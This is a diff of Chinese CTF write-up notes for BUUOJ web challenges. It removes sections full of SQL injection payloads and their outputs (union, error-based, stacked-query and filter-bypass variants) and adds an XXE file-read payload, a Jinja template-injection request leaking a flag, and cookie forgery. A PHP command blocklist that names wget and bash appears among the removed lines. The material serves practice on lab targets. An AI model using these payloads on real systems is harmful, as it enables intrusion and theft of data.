@@ -22,6 +22,7 @@ tags:
 4. [素数分解](https://factordb.com/)
 5. [Playfair](https://rumkin.com/tools/cipher/playfair/)
 6. [MD5 collisions](https://github.com/corkami/collisions?spm=5176.28103460.0.0.72ab6308WVILLI)
+7. [Unicode](https://www.compart.com/en/unicode/)
 
 # Linux(Ubuntu)下下载的文件乱码问题（Crypto中特别多）
 1. 查看文件编码
@@ -42,6 +43,8 @@ Simplified Chinese National Standard; GB2312
 iconv -f GBK -t UTF-8 乱码文件.txt -o 正常文件_utf8.txt
 ```
 
+
+
 ## Basic
 
 ### [2 BRUTE 1](https://buuoj.cn/challenges#BUU%20BRUTE%201)
@@ -52,81 +55,12 @@ GET /?username=admin&password=1 HTTP/1.1
 BurpSuite对密码进行爆破
 ### [3 Upload-Labs-Linux](https://buuoj.cn/challenges#Upload-Labs-Linux)
 
-### [Juice Shop](https://buuoj.cn/challenges#Juice%20Shop)
-SQL注入+爆破
 ### [xianzhi_xss](https://buuoj.cn/challenges#xianzhi_xss)
 xss lab
 ### [2019 Havefun](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Havefun)
 请求参数`?cat=dog`
 ### [2019 Knife](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Knife)
 AntSword工具直连
-
-### [2019 EasySQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL)
-SQL漏洞，`1' or 1=1#`登录成功
-```
-GET /check.php?username=1%27+or+1%3D1%23&password=1 HTTP/1.1
-```
-### [2019 LoveSQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]LoveSQL)
-sql的select没有group_concat一般只回显一条记录
-```sql
-username=1&password=2' or 1='1' group by 3#
-username=1&password=2%27%20or%201=%271%27%20group%20by%203%23
-
-> Unknown column '4' in 'group statement'
-
-username=1&password=2%27%20union%20select%201,2,3%23
-> 2,3
-username=1&password=2%27%20union%20select%201,database(),3%23
-> geek
-username=1&password=2%27%20union%20select%201,group_concat(table_name),3%20from%20mysql.innodb_table_stats%20where%20database_name='geek'%23
-> geekuser,l0ve1ysq1
-username=1&password=2%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema='geek'%20and%20table_name='geekuser'%23
-> username,password
-> id,username,password (table_name='l0ve1ysq1')
-username=1&password=2%27%20union%20select%201,username,password%20from%20geek.geekuser%23
-> admin, 251c39b7cef2c57ab4eb885d375d723a
-> cl4y, wo_tai_nan_le
-username=1&password=2%27%20union%20select%201,2,group_concat(id,username,password)%20from%20geek.l0ve1ysq1%23
-```
-### [2019 BabySQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]BabySQL)
-```
-GET /check.php?username=admin&password=1'%20order%20by%206%20--%20- HTTP/1.1
-> MariaDB server version for the right syntax to use near 'der  6 -- -'' at line 1
-GET /check.php?username=admin&password=1'oorr'1'='1'%20--%20- HTTP/1.1
-```
-过滤了`or`和`by`
-```
-GET /check.php?username=admin&password=1'union%20select1,2,3%20--%20- HTTP/1.1
-> MariaDB server version for the right syntax to use near '1,2,3 -- -'' at line 1
-```
-过滤了`union`和`select`，尝试带其它关键词的发现也过滤了`where`、`from`、`and`。
-```
-GET /check.php?username=1&password=1'%20uunionnion%20sselectelect%201,2,3--%20- HTTP/1.1
-> 2, 3
-GET /check.php?username=1&password=1'%20uunionnion%20sselectelect%201,group_concat(table_name),3%20ffromrom%20mysql.innodb_table_stats%20wwherehere%20database_name='geek'--%20- HTTP/1.1
-> b4bsql,geekuser
-GET /check.php?username=1&password=1'%20uunionnion%20sselectelect%201,group_concat(column_name),3%20ffromrom%20infoorrmation_schema.columns%20wwherehere%20table_schema='geek'%20aandnd%20table_name='geekuser'--%20- HTTP/1.1
-> id,username,password (b4bsql同)
-......
-```
-### [2019 HardSQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]HardSQL)
-报错注入
-```
-GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,database(),0x7e),1));%23 HTTP/1.1
-> XPATH syntax error: '~geek~'
-GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata)),0x7e),1));%23 HTTP/1.1
-> XPATH syntax error: '~information_schema,performance_'
-GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1));%23 HTTP/1.1
-> XPATH syntax error: '~H4rDsq1~'
-GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1));%23 HTTP/1.1
-> XPATH syntax error: '~id,username,password~'
-GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(geek.H4rDsq1)),0x7e),1));%23 HTTP/1.1
-> XPATH syntax error: '~1flagflag{7acb6ee1-7e45-43ba-95'
-GET /check.php?username=1&password=1'or(updatexml(1,right(concat(0x7e,(select(group_concat(password,id))from(geek.H4rDsq1)),0x7e),40),1));%23 HTTP/1.1
-> XPATH syntax error: 'ee1-7e45-43ba-9594-00cbbe785abe}'
-```
-### [2019 FinalSQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]FinalSQL)
-盲注。。。
 
 ### [File](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Secret%20File)
 xxx.php后直接接?xxx=，一直写成xxx.php/?xxx=一直没反应到怀疑人生。。。
@@ -137,8 +71,6 @@ Content-Type: application/x-www-form-urlencoded
 
 <?php phpinfo(); ?>
 ```
-
-
 ### [PHP](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]PHP)
 ```sh
 $ ./dirsearch.py -u http://c65280b2-9099-46ee-8182-3f20914c830c.node5.buuoj.cn:81/ -e "*" --delay 0.1 -t 1 -i 200,403
@@ -1753,51 +1685,6 @@ GET /calc.php?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(9
 ```
 ### [admin](https://buuoj.cn/challenges#[HCTF%202018]admin)
 
-
-
-### [Blacklist](https://buuoj.cn/challenges#[GYCTF2020]Blacklist)
-```sql
-1 or extractvalue(1, (select database()) )
-
-return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
-
-1';show databases;#
-
-array(1) {
-  [0]=>
-  string(11) "ctftraining"
-}
-
-1';show tables;#
-
-array(1) {
-  [0]=>
-  string(8) "FlagHere"
-}
-
-1'; show columns from `FlagHere` ; #
-
-array(6) {
-  [0]=>
-  string(4) "flag"
-  [1]=>
-  string(12) "varchar(100)"
-  [2]=>
-  string(2) "NO"
-  [3]=>
-  string(0) ""
-  [4]=>
-  NULL
-  [5]=>
-  string(0) ""
-}
-
-1';PREPARE hacker from concat('s','elect', ' * from `FlagHere` ');EXECUTE hacker;#
-
-return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
-
-1';EXECUTE IMMEDIATE concat('s','elect',' * from `FlagHere` ');#
-```
 ### [Easy Java](https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java)
 改用Post访问help页面
 ```sh
@@ -1831,39 +1718,7 @@ POST /Download?filename=/WEB-INF/web.xml HTTP/1.1
 POST /Download?filename=/WEB-INF/classes/com/wm/ctf/FlagController.class HTTP/1.1
 ```
 得到.class文件后进行java反编译，但失败。。。内容中有一串明显base64: ZmxhZ3tiNmVmZTdiMC01NmJlLTQ5NWEtOTA3My05NGM2NWZlZDVjMjN9Cg== 解码得到flag
-### [BabySQli](https://buuoj.cn/challenges#[GXYCTF2019]BabySQli)
-```sh
-name=admin'#&pw=1
 
-wrong pass!
-
-name=admin';show%20tables;#&pw=1
-
-Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'show tables;#'' at line 1
-
-name=admin';or%20show%20tables;#&pw=1
-
-do not hack me!
-```
-可知过滤了`or/database()`
-```sh
-name=admin'%20union%20select%201,2,3#&pw=1
-
-wrong pass!
-```
-F12及返回中都有注释，先base32再base64得到
-```php
-<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->
-
-b"select * from user where username = '$name'"
-
-pw='abc'
-md5(pw.encode()).hexdigest()
-'900150983cd24fb0d6963f7d28e17f72'
-
-name=1'union%20select%201,'admin','900150983cd24fb0d6963f7d28e17f72'#&pw=abc
-```
-是怎么猜出pw用了md5的？？？
 ### [Easy MD5](https://buuoj.cn/challenges#[BJDCTF2020]Easy%20MD5)
 ```sh
 hint: select * from 'admin' where password=md5($pass,true)
@@ -1924,41 +1779,37 @@ m1 = hashlib.md5(file.encode()).hexdigest()
 h = hashlib.md5((secret + m1).encode()).hexdigest()
 print(h)
 ```
-### [easy_web](https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_web)
+### [Fake XML cookbook](https://buuoj.cn/challenges#[NCTF2019]Fake%20XML%20cookbook)
+xml注入
+```xml
+<?xml version = "1.0" encoding = "utf-8"?><!DOCTYPE test [
+    <!ENTITY admin SYSTEM "file:///flag">
+]>
+
+<user><username>&admin;</username><password>123456</password></user>
+```
+### [shrine](https://buuoj.cn/challenges#[WesternCTF2018]shrine)
+```py
+import flask import os app = flask.Flask(__name__) app.config['FLAG'] = os.environ.pop('FLAG') @app.route('/') def index(): return open(__file__).read() @app.route('/shrine/') def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine)) if __name__ == '__main__': app.run(debug=True)
+```
+SSTI (Server-Side Template Injection，服务器端模板注入)。
+```
+GET /shrine/%7B%7Burl_for.__globals__['current_app'].config['FLAG']%7D%7D HTTP/1.1
+```
+### [Kookie](https://buuoj.cn/challenges#[BSidesCF%202019]Kookie)
+增加Cookie即可
 ```sh
-GET /index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd= HTTP/1.1
+Cookie: username=admin
 ```
-`TXpVek5UTTFNbVUzTURabE5qYz0`->base64->base64->ascii hex->`555.png`，反向操作`index.php`得到源码
-```php
-<?php
-error_reporting(E_ALL || ~ E_NOTICE);
-header('content-type:text/html;charset=utf-8');
-$cmd = $_GET['cmd'];
-if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
-    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
-$file = hex2bin(base64_decode(base64_decode($_GET['img'])));
-
-$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
-if (preg_match("/flag/i", $file)) {
-    echo '<img src ="./ctf3.jpeg">';
-    die("xixiï½ no flag");
-} else {
-    $txt = base64_encode(file_get_contents($file));
-    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
-    echo "<br>";
-}
-echo $cmd;
-echo "<br>";
-if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
-    echo("forbid ~");
-    echo "<br>";
-} else {
-    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
-        echo `$cmd`;
-    } else {
-        echo ("md5 is funny ~");
-    }
-}
-
-?>
+### [Web11](https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA]Web11)
 ```
+```
+### [Unicorn shop](https://buuoj.cn/challenges#[ASIS%202019]Unicorn%20shop)
+```sh
+<meta charset="utf-8"><!--Ah,really important,seriously. -->
+```
+字符编码问题
+```
+id=4&price=%E2%86%81
+```
+### [朴实无华](https://buuoj.cn/challenges#[WUSTCTF2020]%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E)
